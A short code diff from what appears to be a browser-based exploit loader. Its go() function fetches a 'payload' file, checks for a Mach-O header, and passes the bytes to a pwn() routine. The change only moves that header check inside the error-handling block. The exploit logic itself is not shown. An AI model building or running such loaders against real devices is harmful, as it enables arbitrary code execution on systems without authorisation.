@@ -408,15 +408,14 @@ function get_mem_new(stage1) {
 function go() {
     fetch('payload').then((response) => {
         response.arrayBuffer().then((buffer) => {
-            var arrayBuf = new Uint8Array(buffer);
-            var header = b2u32(arrayBuf.slice(0, 4)); // sanity check on the header
-            if(header != 0xfeedfacf)
-            {
-                fail(`header is invalid: ${hexit(header)}, should be 0xfeedfacf\nwtf is your payload??`);
-                return;
-            }
-
             try {
+                var arrayBuf = new Uint8Array(buffer);
+                var header = b2u32(arrayBuf.slice(0, 4)); // sanity check on the header
+                if(header != 0xfeedfacf)
+                {
+                    fail(`header is invalid: ${hexit(header)}, should be 0xfeedfacf\nwtf is your payload??`);
+                    return;
+                }
                 pwn(arrayBuf);
             } catch (e) {
                 fail(`Error: ${e}\n${e.stack}`);
